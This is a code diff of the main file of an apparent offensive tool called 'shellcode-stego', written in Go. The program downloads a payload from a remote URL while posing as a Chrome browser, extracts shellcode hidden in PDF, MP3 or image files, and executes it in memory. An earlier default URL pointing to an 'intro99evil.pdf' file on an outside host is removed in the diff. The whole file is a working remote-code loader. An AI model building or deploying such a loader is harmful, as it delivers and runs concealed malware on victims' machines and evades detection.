@@ -1,68 +1,68 @@
 package main
 
 import (
+	"errors"
 	"flag"
 	"fmt"
-	"shellcode-stego/pkg/extractor"
-	"shellcode-stego/pkg/runshellthread"
 	"io"
 	"net/http"
+	"os"
+	"path/filepath"
 	"strings"
 	"time"
+
+	"shellcode-stego/pkg/extractor"
+	"shellcode-stego/pkg/execute"
 )
 
 const (
 	// Default URL to download from if none provided, configure this before build to point to your payload to avoid passing CLI flags on run
-	defaultDownloadURL = "https://l.station307.com/FANybhNDyTG4PHmEShkodF/intro99evil.pdf"
+	defaultDownloadURL = ""
+	// feel free to change this to whatever you want.. this is just a stand in so it isn't the go net/http user agent
+	userAgent         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
 )
 
-
-
-// formatBytesAsHex formats a byte slice as a hex string
-func formatBytesAsHex(data []byte) string {
-	var result strings.Builder
-	for i, b := range data {
-		result.WriteString(fmt.Sprintf("%02X", b))
-		if i < len(data)-1 {
-			result.WriteString(" ")
-		}
-	}
-	return result.String()
+type Config struct {
+	URL           string
+	ForceImage    bool
+	ForceMP3      bool
+	ForcePDF      bool
+	ForceShellcode bool
 }
 
-func main() {
+func parseFlags() (*Config, error) {
+	config := &Config{}
 	
-	// Parse command line flags
-	isImagePtr := flag.Bool("image", false, "Specifies whether the payload is embedded in an image file (PNG/JPEG)")
-	isMP3Ptr := flag.Bool("mp3", false, "Specifies whether the payload is embedded in an MP3 file's ID3 tags")
-	isPDFPtr := flag.Bool("pdf", false, "Specifies whether the payload is embedded in a PDF file's metadata")
-	isShellcodePtr := flag.Bool("shellcode", false, "Specifies whether the payload is raw shellcode")
+	flag.BoolVar(&config.ForceImage, "image", false, "Force extraction from image file (PNG/JPEG)")
+	flag.BoolVar(&config.ForceMP3, "mp3", false, "Force extraction from MP3 ID3 tags")
+	flag.BoolVar(&config.ForcePDF, "pdf", false, "Force extraction from PDF metadata")
+	flag.BoolVar(&config.ForceShellcode, "shellcode", false, "Treat payload as raw shellcode (skip extraction)")
 	flag.Parse()
 
-	// Get URL from remaining args
+
 	args := flag.Args()
-
-	// Determine downloadURL based on command-line arguments
-	var downloadURL string
-	if len(args) < 1 {
-		downloadURL = defaultDownloadURL
-	} else {
-		downloadURL = args[0]
-		// Basic URL validation
-		if !strings.HasPrefix(downloadURL, "http://") && !strings.HasPrefix(downloadURL, "https://") {
-			fmt.Println("URL must start with http:// or https://")
-			return
+	if len(args) > 0 {
+		config.URL = args[0]
+		if !isValidURL(config.URL) {
+			return nil, errors.New("URL must start with http:// or https://")
 		}
+	} else {
+		config.URL = defaultDownloadURL
 	}
 
-	if downloadURL == "" {
-		fmt.Println("Error: No download URL provided and no default URL configured")
-		flag.Usage()
-		return
+	if config.URL == "" {
+		return nil, errors.New("no download URL provided and no default URL configured")
 	}
 
-	// http client to download the payload
-	client := &http.Client{
+	return config, nil
+}
+
+func isValidURL(url string) bool {
+	return strings.HasPrefix(url, "http://") || strings.HasPrefix(url, "https://")
+}
+
+func createHTTPClient() *http.Client {
+	return &http.Client{
 		Timeout: 60 * time.Second,
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
 			if len(via) >= 30 {
@@ -71,64 +71,107 @@ func main() {
 			return nil
 		},
 	}
+}
 
-	// create the HTTP request with a standard user agent
-	req, err := http.NewRequest("GET", downloadURL, nil)
+func downloadPayload(url string) ([]byte, error) {
+	client := createHTTPClient()
+
+	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
-		fmt.Println("Error creating request:", err)
-		return
+		return nil, fmt.Errorf("failed to create request: %w", err)
 	}
 
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36")
+	req.Header.Set("User-Agent", userAgent)
 
 	resp, err := client.Do(req)
 	if err != nil {
-		fmt.Println("Error downloading payload:", err)
-		return
+		return nil, fmt.Errorf("failed to download payload: %w", err)
 	}
 	defer resp.Body.Close()
 
 	if resp.StatusCode != http.StatusOK {
-		fmt.Printf("Error: HTTP status %d\n", resp.StatusCode)
-		return
+		return nil, fmt.Errorf("HTTP request failed with status %d", resp.StatusCode)
 	}
 
 	payload, err := io.ReadAll(resp.Body)
 	if err != nil {
-		fmt.Println("Error reading payload:", err)
-		return
+		return nil, fmt.Errorf("failed to read response body: %w", err)
 	}
+	
+	return payload, nil
+}
 
-	// If payload is embedded in an image, MP3, or PDF, extract it
-	if *isImagePtr || *isMP3Ptr || *isPDFPtr {
+func shouldExtract(config *Config, url string) bool {
+	if config.ForceShellcode {
+		return false
+	}
+	
+	if config.ForceImage || config.ForceMP3 || config.ForcePDF {
+		return true
+	}
+	
+	ext := strings.ToLower(filepath.Ext(url))
+	switch ext {
+	case ".pdf":
+		return true
+	case ".mp3":
+		return true
+	case ".png", ".jpg", ".jpeg":
+		return true
+	case ".bin", ".exe":
+		return false 
+	default:
+		return true
+	}
+}
+
+func processPayload(payload []byte, config *Config) ([]byte, error) {
+
+	if shouldExtract(config, config.URL) {
 		extractedPayload, err := extractor.ExtractPEFromBytes(payload)
 		if err != nil {
-			fmt.Println("Error extracting payload:", err)
-			return
+
+			fmt.Fprintf(os.Stderr, "Extraction failed, treating as raw payload: %v\n", err)
+			return payload, nil
 		}
-		payload = extractedPayload
+		return extractedPayload, nil
 	}
+	
+	return payload, nil
+}
 
-	// For shellcode, execute directly using runshellthread
-	if *isShellcodePtr {
-		_, err := runshellthread.ExecuteShellcode(payload, true)
-		if err != nil {
-			fmt.Println("Error executing shellcode:", err)
-			return
-		}
+func executePayload(payload []byte) error {
+	if len(payload) == 0 {
+		return errors.New("payload is empty")
+	}
+	
+	execute.ExecuteShellcode(payload)
+	return nil
+}
 
-		
-		// Give the shellcode some time to start executing before prompting
+func run() error {
+	config, err := parseFlags()
+	if err != nil {
+		return err
+	}
+	
+	payload, err := downloadPayload(config.URL)
+	if err != nil {
+		return err
+	}
+	
+	processedPayload, err := processPayload(payload, config)
+	if err != nil {
+		return err
+	}
+	
+	return executePayload(processedPayload)
+}
 
-		time.Sleep(5 * time.Second)
-		
-
-		
-		// Keep the main process alive
-		// This allows the shellcode to continue running even if it doesn't signal completion
-		fmt.Scanln() // Wait for user input before exiting
-		
-		// Cleanup
-		return
+func main() {
+	if err := run(); err != nil {
+		fmt.Fprintf(os.Stderr, "Error: %s\n", err.Error())
+	flag.Usage()
+		os.Exit(1)
 	}
 }
